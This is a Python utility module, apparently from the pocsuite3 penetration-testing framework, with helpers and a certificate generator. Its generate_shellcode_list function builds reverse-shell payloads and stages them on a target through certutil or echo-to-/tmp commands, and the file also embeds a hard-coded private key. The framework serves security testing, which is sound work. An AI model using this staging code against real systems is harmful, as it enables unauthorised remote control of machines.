import ast
import base64
import binascii
import os
import string
import random
from socket import gethostbyname
from urllib.parse import urlparse
from pocsuite3.lib.core.data import logger, paths
from pocsuite3.lib.core.enums import (
    CUSTOM_LOGGING, OS, OS_ARCH, SHELLCODE_CONNECTION
)
# for pocsuite 2.x
from pocsuite3.lib.core.exception import PocsuiteGenericException
from pocsuite3.shellcodes import OSShellcodes


def url2ip(url, with_port=False):
    """
    works like turning 'http://baidu.com' => '180.149.132.47'
    """

    url_prased = urlparse(url)
    if url_prased.port:
        ret = gethostbyname(url_prased.hostname), url_prased.port
    elif not url_prased.port and url_prased.scheme == 'https':
        ret = gethostbyname(url_prased.hostname), 443
    else:
        ret = gethostbyname(url_prased.hostname), 80

    return ret if with_port else ret[0]


def str_to_dict(value):
    try:
        return ast.literal_eval(value)
    except ValueError as e:
        logger.log(CUSTOM_LOGGING.ERROR, "conv string failed : {}".format(str(e)))


def random_str(length=10, chars=string.ascii_letters + string.digits):
    return ''.join(random.sample(chars, length))


def get_middle_text(text, prefix, suffix, index=0):
    """
    Simple implementation of obtaining intermediate text

    :param text:Full text to get
    :param prefix:To get the first part of the text
    :param suffix: To get the second half of the text
    :param index: Where to get it from
    :return:
    """
    try:
        index_1 = text.index(prefix, index)
        index_2 = text.index(suffix, index_1 + len(prefix))
    except ValueError:
        # logger.log(CUSTOM_LOGGING.ERROR, "text not found pro:{} suffix:{}".format(prefix, suffix))
        return ''
    return text[index_1 + len(prefix):index_2]


def generate_shellcode_list(listener_ip, listener_port, os_target=OS.WINDOWS, os_target_arch=OS_ARCH.X86,
                            chunked_num=50, profix=None, write_path=None):
    """
    Generate executable shellcode for shell rebound under Windows/Linux. When writing a POC with command execution,
    execute the list returned by this command.

    :param listener_ip: Listening IP
    :param listener_port: Listening port
    :param os_target: System type, default is Windows
    :param os_target_arch: System architecture, the default is x86
    :param chunked_num: Specify how much quantity is one piece, the default is 50
    :param profix: Select the prefix of the command execution, the default is None. Automatically select according to
            the operating system
    :param write_path: The written file directory, when the default is None, Windows will write to the %TEMP% directory,
            Linux will write to the /tmp directory, the file name is random
    :return: list of command
    """

    bad_chars = ["\x00", "\x0a", "\x0d", "\x3b"]
    s = OSShellcodes(os_target, os_target_arch, listener_ip, listener_port, bad_chars)
    connection_type = SHELLCODE_CONNECTION.REVERSE
    filename = random_str(5)
    filepath = os.path.join(paths.POCSUITE_TMP_PATH, filename)
    if os_target == OS.WINDOWS:
        filepath = os.path.join(paths.POCSUITE_TMP_PATH, filename) + '.exe'
    shellcode = s.create_shellcode(
        connection_type,
        encode='',
        make_exe=1,
        debug=0,
        # dll_inj_funcs=dll_funcs,
        filename=filename,
        # use_precompiled=False
    )
    if not os.path.exists(filepath):
        raise PocsuiteGenericException("generate file does not exist!")
    with open(filepath, 'rb') as f:
        data = f.read()

    os.unlink(filepath)
    if profix is None:
        if os_target == OS.WINDOWS:
            profix = "cmd.exe /q /c "
        elif os_target == OS.LINUX:
            profix = ""

    index = 0
    cmd = []
    rand_str = random_str(4)
    if os_target == OS.WINDOWS:
        data = base64.b64encode(data).decode()
        length = len(data)

        if write_path is None:
            write_path = "%TEMP%"
        filename = r"{path}\{rand}.bs4".format(path=write_path, rand=rand_str)
        filename_out = r"{path}\{rand}.exe".format(path=write_path, rand=rand_str)
        while 1:
            if index > length:
                break
            _cmd = data[index:index + chunked_num]
            flag = ">>"
            if index == 0:
                flag = ">"
            cmd.append(profix + r"echo {payload} {flag} {filename}".format(payload=_cmd, flag=flag, filename=filename))
            index = index + chunked_num
        cmd.append(profix + "certutil -decode {input} {output}".format(input=filename, output=filename_out))
        cmd.append(profix + filename_out)
    elif os_target == OS.LINUX:
        length = len(data)
        echo_prefix = "\\x"
        if write_path is None:
            write_path = "/tmp"
        filename = r"{path}/{rand}".format(path=write_path, rand=rand_str)
        while 1:
            if index > length:
                break

            block = str(binascii.hexlify(data[index:index + chunked_num]), "utf-8")
            block = echo_prefix + echo_prefix.join(a + b for a, b in zip(block[::2], block[1::2]))
            command = profix + 'echo -ne "{}" >> {}'.format(block, filename)
            cmd.append(command)
            index = index + chunked_num
        cmd.append("chmod u+x " + filename)
        cmd.append(profix + filename)

    return cmd


def gen_cert(emailAddress="s1@seebug.org",
             commonName="Cyberspace",
             countryName="CN",
             localityName="Cyberspace",
             stateOrProvinceName="Cyberspace",
             organizationName="Seebug",
             organizationUnitName="pocsuite.org",
             serialNumber=0,
             validityStartInSeconds=0,
             validityEndInSeconds=10*365*24*60*60,
             filepath="cacert.pem"):

    # openssl library dependencies is too heavy, so we move it to extras_require
    try:
        from OpenSSL import crypto
        # create a key pair
        k = crypto.PKey()
        k.generate_key(crypto.TYPE_RSA, 4096)
        # create a self-signed cert
        cert = crypto.X509()
        cert.get_subject().C = countryName
        cert.get_subject().ST = stateOrProvinceName
        cert.get_subject().L = localityName
        cert.get_subject().O = organizationName
        cert.get_subject().OU = organizationUnitName
        cert.get_subject().CN = commonName
        cert.get_subject().emailAddress = emailAddress
        cert.set_serial_number(serialNumber)
        cert.gmtime_adj_notBefore(0)
        cert.gmtime_adj_notAfter(validityEndInSeconds)
        cert.set_issuer(cert.get_subject())
        cert.set_pubkey(k)
        cert.sign(k, 'sha512')
        with open(filepath, "wb+") as fw:
            fw.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
            fw.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))
    except ImportError:
        logger.warning('pyOpenSSL not installed, use hard-code certificate instead')
        # base64 encoding to avoid cert leak warning
        hard_coded_cert_base64 = (
            b'LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUZtakNDQTRJQ0FRQXdEUVlK'
            b'S29aSWh2Y05BUUVOQlFBd2daSXhDekFKQmdOVkJBWVRBa05PTVJNd0VRWUQKVlFR'
            b'SURBcERlV0psY25Od1lXTmxNUk13RVFZRFZRUUhEQXBEZVdKbGNuTndZV05sTVE4'
            b'd0RRWURWUVFLREFaVApaV1ZpZFdjeEZUQVRCZ05WQkFzTURIQnZZM04xYVhSbExt'
            b'OXlaekVUTUJFR0ExVUVBd3dLUTNsaVpYSnpjR0ZqClpURWNNQm9HQ1NxR1NJYjNE'
            b'UUVKQVJZTmN6RkFjMlZsWW5WbkxtOXlaekFlRncweU1UQTNNamN3T0RFNU5EUmEK'
            b'Rncwek1UQTNNalV3T0RFNU5EUmFNSUdTTVFzd0NRWURWUVFHRXdKRFRqRVRNQkVH'
            b'QTFVRUNBd0tRM2xpWlhKegpjR0ZqWlRFVE1CRUdBMVVFQnd3S1EzbGlaWEp6Y0dG'
            b'alpURVBNQTBHQTFVRUNnd0dVMlZsWW5Wbk1SVXdFd1lEClZRUUxEQXh3YjJOemRX'
            b'bDBaUzV2Y21jeEV6QVJCZ05WQkFNTUNrTjVZbVZ5YzNCaFkyVXhIREFhQmdrcWhr'
            b'aUcKOXcwQkNRRVdEWE14UUhObFpXSjFaeTV2Y21jd2dnSWlNQTBHQ1NxR1NJYjNE'
            b'UUVCQVFVQUE0SUNEd0F3Z2dJSwpBb0lDQVFEYlRpRXNjRkR4QjBMUUZOaTNmN29u'
            b'MS8wYk5tbUpYRXZLYzY1UFAvNXlSazJpc3VMU3hvMUc2Sk1SCkVJR0tGT1FPZlA3'
            b'N2lwRDdRU3JjdDRSVEtsSTZORDFkSlB5SWJkSlIwL1RXc2xVNWxwQkpReW56d2x0'
            b'RnJRYVUKalRlSDJwMUk2MTNVLzZERXQxbGdhNGxpeXRQb2E4QzM4TUQyZ2xHWktN'
            b'S2libUlLNHgvQTdrTndtcXIrNWVtawprd2ErWjhpZzA0QU5DdkpkOWNacW1iNUp2'
            b'anN1Y3pHNVFuRzZrYUFOaGw5cGZSSk8zSy9sQmVtekZ3S2hFTWlECldaWnJFbGwz'
            b'NjlIcnhiQjRuaEpGU0MwTW92MzRZZFJid21NMENkdmFJUFlpZm5uKzBHUnRLRTZt'
            b'cDZPVEEvOHMKdS9IYm1OU1RHZG5MQ3lhVk4zSzFhWUw5dkVRMUpPcTB4MjRYK0J2'
            b'NG9YcjBMWGRXR3NNUUwzeHNXM3NoenBYYgppZXBXamNwVGNKdHhVSHMyQUZlOVlo'
            b'aW94anZjWjdFU29YUVV4RURkajBhaWdLVndEUTdZdzZvd09obWdxK2pBCnYwTThX'
            b'c0tVQzZNb2RDTVArTnZieEVybTBoK3UzUkRtZmdZd1kxM0ZjTFBMTlQzQkVyQy9k'
            b'UHljUkFQZjlhUXQKSWVXSjlpUVZHUndGTVN5dFNUNWJNekQzM3FtU1hlVVBvMzdU'
            b'Y0VsQkhCM1c1Z1IxdmVVaThqU1ZSbjBzYitWdgp4UWtlQTVqZHFBUG9yTHMwZ3RT'
            b'ZHZ3NFhUTHlZZVZaUUYvTVROaVBuV0ZGWGtlb0YrYUJ5cjlFM2wxT2RCNVZzCnRi'
            b'N3JvU1hRK0E3bTArdFNPOWVJWmNoTXdBdHBPN0FZUC81cmQxbUFMMGY4RFRzNWRR'
            b'SURBUUFCTUEwR0NTcUcKU0liM0RRRUJEUVVBQTRJQ0FRQXF3b2RwY3hhbnJ4RHYr'
            b'anBBbm1rM2NFaENOcXVhNnk1VVJ5cGpNM2EyTzlGTgpDY3dZamVjNG1Hdi9SVnh1'
            b'Y0tXTmRRQVVhellYMVBpdUFzMUpnVVBRaGdnZTVhTkI4M1lQNjlndlhmWlF6U052'
            b'CmFXTHJObXdLeE9ZdUZzaWV4aUtzcTRaTXBwWldNcURRYnpTOE5aRGVsVEJZVjll'
            b'eWM2enRSZXU4LzRHc3FXNWcKVUEyZzhKcXBmbStWOUIvTjhsRjY5Ykw0bC8rSytj'
            b'RzNxWXl3WVQzN3JlMmVmdDhhcWtZblJVeVBPeWw5cGttZQpqZEJ2bjY1cDBqNUZ5'
            b'THJSS01oZjJZWUZVQldXeXlCd3RubG50OFVqOFlmbnp3VGhBb0pwemlONTZGRjda'
            b'eGZ3CnlLb1JXY2NueXl4MnFxU3B2Q05NVlE1dkd3RUVvZUp3SklLYnBpazRhaDho'
            b'WlZ4ZG5jN3pGRU9DbzJIeTUrNjUKWnhGbS8vbjZjTnI2eG9uUTZWVFp3ZXRYT1Fa'
            b'aC9ybkN5emUwaVZ3OEo0RytsM0tvRk5YM092em9oL1dNQXc2TwovTzQxLzI0OFhH'
            b'UW15S210aDRMRDB5NFcwQTErUFNpV24rb0NheDVRblNUMTNKMTNtT05ZV1p4RG42'
            b'b0RkSjQ2CmhpN3NiZnFab3QyMWxIV0hFOUIwWlV2SUJrWkJRVktjR3Q5dFBXeDBL'
            b'VWxPSTlWb01IeGdwNWhkSExidTg2cG4KQitrdll0bnh3N2F5em4yL3Jtd1NYeDRl'
            b'OTFjcXVmVy9UMXIvamlVN3BCTHE1b0RJTWl3MmgxbnIwYmp1ZTNUZgpVaWhKTEhH'
            b'Z2dnSHRFRkdxenFxbU8zak9DTSt5czhhVDY0Q3VNcDVIZ1ptZjFGZVBYV3A3bTla'
            b'WUNpS0htdz09Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0KLS0tLS1CRUdJTiBQ'
            b'UklWQVRFIEtFWS0tLS0tCk1JSUpSQUlCQURBTkJna3Foa2lHOXcwQkFRRUZBQVND'
            b'Q1M0d2dna3FBZ0VBQW9JQ0FRRGJUaUVzY0ZEeEIwTFEKRk5pM2Y3b24xLzBiTm1t'
            b'SlhFdktjNjVQUC81eVJrMmlzdUxTeG8xRzZKTVJFSUdLRk9RT2ZQNzdpcEQ3UVNy'
            b'Ywp0NFJUS2xJNk5EMWRKUHlJYmRKUjAvVFdzbFU1bHBCSlF5bnp3bHRGclFhVWpU'
            b'ZUgycDFJNjEzVS82REV0MWxnCmE0bGl5dFBvYThDMzhNRDJnbEdaS01LaWJtSUs0'
            b'eC9BN2tOd21xcis1ZW1ra3dhK1o4aWcwNEFOQ3ZKZDljWnEKbWI1SnZqc3Vjekc1'
            b'UW5HNmthQU5obDlwZlJKTzNLL2xCZW16RndLaEVNaURXWlpyRWxsMzY5SHJ4YkI0'
            b'bmhKRgpTQzBNb3YzNFlkUmJ3bU0wQ2R2YUlQWWlmbm4rMEdSdEtFNm1wNk9UQS84'
            b'c3UvSGJtTlNUR2RuTEN5YVZOM0sxCmFZTDl2RVExSk9xMHgyNFgrQnY0b1hyMExY'
            b'ZFdHc01RTDN4c1czc2h6cFhiaWVwV2pjcFRjSnR4VUhzMkFGZTkKWWhpb3hqdmNa'
            b'N0VTb1hRVXhFRGRqMGFpZ0tWd0RRN1l3Nm93T2htZ3ErakF2ME04V3NLVUM2TW9k'
            b'Q01QK052Ygp4RXJtMGgrdTNSRG1mZ1l3WTEzRmNMUExOVDNCRXJDL2RQeWNSQVBm'
            b'OWFRdEllV0o5aVFWR1J3Rk1TeXRTVDViCk16RDMzcW1TWGVVUG8zN1RjRWxCSEIz'
            b'VzVnUjF2ZVVpOGpTVlJuMHNiK1Z2eFFrZUE1amRxQVBvckxzMGd0U2QKdnc0WFRM'
            b'eVllVlpRRi9NVE5pUG5XRkZYa2VvRithQnlyOUUzbDFPZEI1VnN0Yjdyb1NYUStB'
            b'N20wK3RTTzllSQpaY2hNd0F0cE83QVlQLzVyZDFtQUwwZjhEVHM1ZFFJREFRQUJB'
            b'b0lDQUFWeW4yaFhNZXVLM3FJRW9vMk1ZcmR5CnFocnU4eGd5YnIrTXVCdkgzeTQv'
            b'aU5ZdDAyeWcrZ2wwNVpKYThwelhnQUxNSUJsbmk4cHlCL3FMcElIY1gwYUsKM2F0'
            b'ZXE5ZEh3eDI5UWl2REtsTFA1cTJyT1hPUXRHdTZySnNzRnVFTkVUTXFoWjR3NjNG'
            b'M2pJVFVwd2tKT05KaApPdHhXNHJRODhJSDVmVHhEdWJQRGlKcG1VTTZQU1Fnajlm'
            b'WGNvU0pCdWI0bEF0MVFGRTA1T2NDVUtTSHowOHlICm1BaWVHZTBraVBGTkVUbXhu'
            b'YTdQMUo2LzB0cGNDL2lzVGc3VlB1TlNCVjd4UUxtMm8zZWJsYUNhOW1PRitRRWUK'
            b'alFQcWhFUmFxbGQwMGloeE05NmNscUlQaWtTaGpYS3RlcjFGdmZCU2o1Vkg0eDBr'
            b'SGNVL0oxNVNUS3E0N29qSApwbHBOQVQwcWtuYUgvc25IYzNXU1ZmNHVXc2pSOHdO'
            b'NlVWL2RDZStqR1Ftb0xLUlNieVN5Rk8rVUtUZFVualBoCndpWFZLSnEwRDR3aHNk'
            b'QUdVRkNLd09Femc4V2gyVlYydllReStRWHZXRXdyWFhwelk1eGM5bEx6Mlhna1Ey'
            b'cTYKb0dpWU0yMWR6UWxZUnlMS0h2ZUpvR2FoZmtCMHZSN3NSenlNNkg0Y3NDb3Bz'
            b'aENlcVhvUytmRjVmNlhMTFJCcQp2MVVBejkrNGk0djJBS3MxenJNSTY5YjA0TXZL'
            b'ZkZ1d0ZINU02eFZNdmZhY2pHQ0o1ajFEeVNkb0FDMVhDcWdmClkraFBQL0NEajZH'
            b'M0pNN1oyZ1ZUWDhWYWpXc1RIaFkrb25hN1o4WloyeS9uZnRMcFljTUVINGlGbEZq'
            b'MklhQnQKenpaQU1KV2dkOTkrblhIckNvdFJBb0lCQVFEMXd6aWJYRUN6c3JvbldS'
            b'T3VEdWZkdk5ZNG5OWFczVVYwdUFYcwo1SFFiRDNCU09xaGYvU2dudDJjSzNNNC8y'
            b'Z1dkSkNCdkFqaHFnNlA5dldpd2FFZ2Y2cXZra0NOMUVLVHNjMU1lCkp0VDM4ZVNX'
            b'UjlUYzZMZXc2QmdLUkRMNzFTUXN1MlYwcGROTHBYdXhQaHlIaGxKb2VPcnhrT2VE'
            b'T2cxNmlid3cKQmZlMW5HQnN3V09KaUloQ01scjNrZmVXN0tVQTFUKys4OWFmZ1Ix'
            b'RmlMblh4b2RsUFNYUFQybXU5UVFsQkVlTworZW5wNTdZb3JXRldjMUc3ZnN3dzNO'
            b'UjB4c3o0d1NTVno0TkFvTWszbjlVaUtLMEVzZ2hiRFpIczVJS2pNTmdNClJHZkcr'
            b'S09tWUEzTXlaMFQxdXFXcmI0M2lyUzRnRUNkTU9vbVRrY0UyUFRhRXdBREFvSUJB'
            b'UURrY01VOGZ2RzIKOGpEaHRXbEVGb0F5Wm1HSlJ0OWRwUzhyTCtPellqMTlVUmtG'
            b'ZkdIdUQzejhPT3ZlVjV2M1hCbDRkbDNkSmNZNwpNWTdxakJtM0JwMFF4VFJiZlVB'
            b'WG1JQjBJOU56QUpYZm9qZGZ0ajZ5bEZScXdOUmVJSDRacWEyWFQxWXJWcTZyCko4'
            b'RU13QXpVY0JobVMrcmIrRXM5dGI5a0hyYTlnTDlhbHZ0MDk0UDZWcW1zZUIzaUlL'
            b'OVRQVTVDRGZiZUhYV0UKS096ZlNoS2FOUDRoZTFsOFFFVGRVNXYxVHR0QWlPRVp6'
            b'dEdQT011S0RPUlk0WlQ5bHZKMGxHNjM3ZWUxclZsUQpzWFpoRlRTbStETC9jNlc0'
            b'VnBOWE9XeXRQcUJScDRhOW9VT0tmZ2x0alRQcWx0Z2hYWFdjMmorYnhpbC93eWZW'
            b'CmhvTCs0cTNPY2hNbkFvSUJBUUM2WjNRTUFwRGd1M01PWFRYY0Uxb3lpUVJDdEZK'
            b'TlFrOW9GQndLYmN6U3FZY2MKRjNtV05NRzhQaE5kM2RSaUFjKzRQS3FOQ0RZYU0v'
            b'YXlnbk5oT2ZkYW5mZjZ5SWpjUmQrUnFIY21xM1ZsQ29mQwpwSUVEZlUrMlVwUEpW'
            b'YWtGOGNnYVZaakNQUFJpc0FWOWpncTlrRmY0L1ozVjAzNkZ2Z1p6SnYwaHY2VCtq'
            b'cmxrClE5cG5lck0rNGtxMDlIWENkNE0vZW45N0toOWpvOTY3MnRSNm9RNFk3NlE1'
            b'OVpYSEtmZ1d5NFFySWNzVnFyWXoKYkM0a0VCdXlCcDZCZ1QxenhVVzZkMlIwYkl5'
            b'MC9EOGlmWXgrK0RNakdKWFYyaGtRZ05IRlRVclJJeUZEZlZ0QwoyaUFkYjk1QUtn'
            b'YU1ld09IeFNFRnYrRkNXTk9BY21iVGVtdGM3SVJaQW9JQkFRRFA5bEc0aHlCcG1n'
            b'WWlGRkttClo0MkJWRzhLMS9oVWVpSjh3SFljUWgwVVRwWG14cHNvYS9VdWNHdFoy'
            b'SXZtSG5RWmxEaFRNU1pMa1F3NFBoN1MKM2pSeXBmVEtMVFlCeFJWN3BYbkR3ZzZ1'
            b'cmpDVzg0UVVjckIvRnRpK2Ivb2NScm4vZTN4SXEvc0xXWCtIcWZhRQpGeUEvVUhH'
            b'WW0ydHozRmRHUUNmQVVNcmpIM3YvdWF6dVk2TEhuZm9tZC9ia1luVXg4U0NDaUhN'
            b'SlEzQ1F2aEE5ClRtemo4alUreGd0cktjaGJBOVRaNVVKM2lpNkFvZ1c1d1k3SDAy'
            b'VWRqeU5lT2hxcFd1Mk1HU21zS2tKSWsxT0IKaFlaM3c4SmtGSHpCOVVjWVdHRCt0'
            b'UElYQkE1R3NBTEpOcmpDb1Z4VTA0NVVvdU14WHE4ODNsOFBKZ3R2R3RGNwpsYUlW'
            b'QW9JQkFRQ2MvL3NNTlc0MUgvVGRyOXdqeWRMZGlaTkNTeHhVVEJnb2dab1BGUDRr'
            b'aUw5WkRycE9yNnNCCmp2L2Nhc0FyVHhBcFkza2NWeUV2cDZ3dVBhMkVqRndERmNU'
            b'S3Z0RDNnVzBEMHg2MTkrZm51TENLL0xEbFpEeWIKUjZYS0NWcXNtYXUxb2lIbnk4'
            b'ME9ReTFxRlEzR1VTMlMwRDZqTkxrcnh4TnFnQnRYVXY0M3U3MEh6NllGOTRDSQpm'
            b'U3FSeTJiV0g2Q3dLRzljNlR0YTdDVUVtcDdiVFZaemxvdlBhbTJ4UThaOGtJeW9l'
            b'RitEbFdOajh1b1UyeXNNCld2YUdUNHdrSlBHc3JJbnpNZXB6a0hPNTlreHJEVS9Z'
            b'eXdRV01KSXExamUvTDVlVmhEbjRrTEJVOFFMbzdFQmgKRE1QWVpFVGp2Uk1oaGZh'
            b'YnRlWEpNQjNFSnowelc3UEIKLS0tLS1FTkQgUFJJVkFURSBLRVktLS0tLQ=='
        )
        hard_coded_cert = base64.b64decode(hard_coded_cert_base64)
        with open(filepath, "wb+") as fw:
            fw.write(hard_coded_cert)
